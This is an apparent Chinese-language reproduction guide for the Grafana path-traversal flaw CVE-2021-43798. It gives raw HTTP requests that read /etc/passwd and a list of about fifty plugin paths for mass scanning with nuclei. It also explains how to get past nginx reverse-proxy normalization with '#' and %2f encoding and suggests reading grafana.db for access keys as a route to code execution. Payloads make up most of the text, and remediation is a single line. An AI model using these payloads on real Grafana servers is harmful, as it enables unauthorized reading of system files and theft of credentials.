# 0x00 漏洞描述
Grafana是一个跨平台、开源的数据可视化网络应用程序平台。用户配置连接的数据源之后，Grafana可以在网络浏览器里显示数据图表和警告。

Grafana 存在未授权任意文件读取漏洞，攻击者在未经身份验证的情况下可通过该漏洞读取主机上的任意文件。

该漏洞源于Grafana在获取公共插件资产的相关函数中对于路径参数的字符清理不当，导致攻击者可以通过将包含特殊目录遍历字符序列(../)的特制HTTP请求发送到受影响的设备来利用此漏洞。成功利用该漏洞的攻击者可以在目标设备上查看文件系统上的的任意文件。

# 0x01 影响范围

8.0.0-beta1 <= Grafana < 8.0.7
8.1.0 <= Grafana < 8.1.8

8.2.0 <= Grafana < 8.2.7

Grafana == 8.3.0

# 0x02 环境搭建
[vulhub/grafana](https://github.com/vulhub/vulhub/blob/master/grafana/CVE-2021-43798/README.zh-cn.md)

![image](https://user-images.githubusercontent.com/84888757/227976969-44e321a9-c39a-4316-a65b-c1a137c59f11.png)


# 0x03 漏洞复现
## 3.1 手工验证
### 1、简单判断插件是否存在：

`/public/plugins/a/a`

若出现 `400` 响应，需要考虑中间件（见后文绕过部分）
```
GET /public/plugins/testplugin/testplugin  HTTP/1.1
Host: Your Ip:port
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: zh-CN,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Pragma: no-cache
Cache-Control: no-cache


```

- 不存在：

<div align=center><img src="https://user-images.githubusercontent.com/84888757/227961840-ba6bf495-b401-4e16-8045-bcad32ca0c35.png" /></div>

![image](https://user-images.githubusercontent.com/84888757/227963443-c5ef2ccd-46c5-418c-9888-41da88313a1e.png)


- 存在:

<div align=center><img src="https://user-images.githubusercontent.com/84888757/227962622-0455b3e4-5b36-4b74-b393-c0b64b47854d.png" /></div>

![image](https://user-images.githubusercontent.com/84888757/227963195-646d0c9b-2d40-4ea9-ab7d-6c817acae60d.png)


![image](https://user-images.githubusercontent.com/84888757/227962787-2b71fefa-6b53-4ef2-8bf3-9d972aa7f3d7.png)


### 2、POC
```
https://xxxxxx.xx/public/plugins/grafana-clock-panel/../../../../../../etc/passwd
```

POC完整数据包：
```
GET /public/plugins/grafana-clock-panel/../../../../../../etc/passwd HTTP/1.1
Host: Your Ip:port
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1


```

![image](https://user-images.githubusercontent.com/84888757/227966492-1248bea9-acac-43f1-b3c5-c3c146c2dc54.png)



## 3.2 批量验证
- 工具：
  - [nuclei扫描工具](https://github.com/projectdiscovery/nuclei)
  - [CVE-2021-43798-Grafana-File-Read-->POC](https://github.com/tangxiaofeng7/CVE-2021-43798-Grafana-File-Read)

- Ubuntu18安装go
  - ```sudo apt-get install golang```

- 下载poc：

```
git clone https://github.com/tangxiaofeng7/CVE-2021-43798-Grafana-File-Read.git
```

- 使用nuclei工具
```
./nuclei -t grafana.yaml -list urls.txt -o Gresult.txt
```

![image](https://user-images.githubusercontent.com/84888757/162635695-1900cffb-5f67-44a2-afeb-5e41c3ffd856.png)


- 默认安装的插件（可测试）
```
/public/plugins/grafana-clock-panel/../../../../../../etc/passwd
/public/plugins/alertGroups/../../../../../../../../etc/passwd
/public/plugins/alertlist/../../../../../../../../etc/passwd
/public/plugins/alertmanager/../../../../../../../../etc/passwd
/public/plugins/annolist/../../../../../../../../etc/passwd
/public/plugins/barchart/../../../../../../../../etc/passwd
/public/plugins/bargauge/../../../../../../../../etc/passwd
/public/plugins/canvas/../../../../../../../../etc/passwd
/public/plugins/cloudwatch/../../../../../../../../etc/passwd
/public/plugins/dashboard/../../../../../../../../etc/passwd
/public/plugins/dashlist/../../../../../../../../etc/passwd
/public/plugins/debug/../../../../../../../../etc/passwd
/public/plugins/elasticsearch/../../../../../../../../etc/passwd
/public/plugins/gauge/../../../../../../../../etc/passwd
/public/plugins/geomap/../../../../../../../../etc/passwd
/public/plugins/gettingstarted/../../../../../../../../etc/passwd
/public/plugins/grafana-azure-monitor-datasource/../../../../../../../../etc/passwd
/public/plugins/grafana/../../../../../../../../etc/passwd
/public/plugins/graph/../../../../../../../../etc/passwd
/public/plugins/graphite/../../../../../../../../etc/passwd
/public/plugins/heatmap/../../../../../../../../etc/passwd
/public/plugins/histogram/../../../../../../../../etc/passwd
/public/plugins/influxdb/../../../../../../../../etc/passwd
/public/plugins/jaeger/../../../../../../../../etc/passwd
/public/plugins/live/../../../../../../../../etc/passwd
/public/plugins/logs/../../../../../../../../etc/passwd
/public/plugins/loki/../../../../../../../../etc/passwd
/public/plugins/mixed/../../../../../../../../etc/passwd
/public/plugins/mssql/../../../../../../../../etc/passwd
/public/plugins/mysql/../../../../../../../../etc/passwd
/public/plugins/news/../../../../../../../../etc/passwd
/public/plugins/nodeGraph/../../../../../../../../etc/passwd
/public/plugins/opentsdb/../../../../../../../../etc/passwd
/public/plugins/piechart/../../../../../../../../etc/passwd
/public/plugins/pluginlist/../../../../../../../../etc/passwd
/public/plugins/postgres/../../../../../../../../etc/passwd
/public/plugins/prometheus/../../../../../../../../etc/passwd
/public/plugins/stat/../../../../../../../../etc/passwd
/public/plugins/state-timeline/../../../../../../../../etc/passwd
/public/plugins/status-history/../../../../../../../../etc/passwd
/public/plugins/table-old/../../../../../../../../etc/passwd
/public/plugins/table/../../../../../../../../etc/passwd
/public/plugins/tempo/../../../../../../../../etc/passwd
/public/plugins/testdata/../../../../../../../../etc/passwd
/public/plugins/text/../../../../../../../../etc/passwd
/public/plugins/timeseries/../../../../../../../../etc/passwd
/public/plugins/welcome/../../../../../../../../etc/passwd
/public/plugins/xychart/../../../../../../../../etc/passwd
/public/plugins/zipkin/../../../../../../../../etc/passwd
```

## 3.3 Nginx 400绕过
- 来自[斗象智能安全](https://blog.riskivy.com/grafana-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E6%B1%87%E6%80%BBcve-2021-43798/)

目前已经部署的 `Grafana` 会有很多被 `nginx/apache` 等中间件反向代理的情况，有的中间件的 [URI_normalization](https://en.wikipedia.org/wiki/URI_normalization) 机制导致 URL 被标准化。

如果使用目标站点是存在漏洞版本但是无法利用成功，那么可能是使用了Nginx代理转发进行了漏洞的修复。

即发送正常 `payload` ，出现400响应，且同时发现中间件为 `nginx` 的情况下，考虑 `nginx` 反代环境中的绕过姿势：

```
# proxy_grafana.conf

server {
    listen         8081;
    server_name    127.0.0.1;
    charset        utf-8;
    location / {
        proxy_pass http://192.168.1.100:3000;
    }
}
```

- 在插件名后添加 `#` 进行绕过，可成功任意文件读取。
```
# BurpSuite

GET /public/plugins/testPluginName/#/../../../../../../../../../../etc/passwd HTTP/1.1
Host: 127.0.0.1:8081
User-Agent: CVE-2021-43798
Connection: close
Upgrade-Insecure-Requests: 1
```

或者 `GET /public/plugins/alertGroups/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd`

- 当 `proxy_pass` 的 `url` 结尾加 `/` 时，再使用上面的 `#` 绕过方式会出现 `302` 跳转。
```
# proxy_grafana.conf

server {
    listen         8081;
    server_name    127.0.0.1;
    charset        utf-8;
    location / {
        proxy_pass http://192.168.1.100:3000/;
    }
}
```

原因如下：

🔗 参考 https://xmanyou.com/nginx-proxy_pass-details/

-  如果 `proxy_pass` 指令中包含 `URI`，也就是带 `/` 

> 如果使用 `URI` 指定 `proxy_pass` 指令，则当请求传递到服务器时，与 `location` 匹配的规范化请求 `URI` 部分将替换为 `proxy_pass` 指令中指定的 `URI`：
```
location /name/ {
    proxy_pass http://127.0.0.1/remote/;
}
```

-  那么，进行以下处理：
    - 标准化请求的 `URI`
    - 将标准化后的 `URI` 中与 `location` 相同的部分移除
    - 剩下的 `URI` 片段，拼接到 `proxy_pass` 指令中的 `URI`


- 如果 `proxy_pass` 指令中不包含 `URI`，也就是不带 `/` 

> 如果指定 `proxy_pass` 时没有 `URI` ，则在处理原始请求时，请求 `URI` 以与客户端发送的相同的形式传递给服务器，或者在处理更改后的 `URI` 时传递完整的规范化请求 `URI` ：
```
location /some/path/ {
      proxy_pass http://127.0.0.1;
  }
```

- 那么，按照以下两种情况处理：
    - 如果原始请求被处理过（所谓的处理，应该是指对 `URI` 进行标准化处理），则原始请求 `URI` 被发送给服务器
    - 在处理改变后的 `URI` 时，完整的标准化后的请求 `URI` 被发送给服务器。

故当 `nginx` 反代为以下配置均可绕过。
```
    location / {
        proxy_pass http://192.168.1.100:3000;
    }
```
```
    location / {
        proxy_pass http://192.168.1.100:3000$request_uri;
    }
```

## 3.4 RCE 思路
RCE方法-->读库(`/var/lib/grafana/grafana.db`)，有几率获取 `AccessKey`

## 3.5 EXP
- https://github.com/A-D-Team/grafanaExp

# 0x04 修复建议
建议升级该组件至最新版本。

# 0x05 参考链接
- [grafana-任意文件读取漏洞分析与汇总 @斗象智能安全](https://blog.riskivy.com/grafana-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E6%B1%87%E6%80%BBcve-2021-43798/)
- [Nginx proxy_pass反向代理](https://xmanyou.com/nginx-proxy_pass-details/)
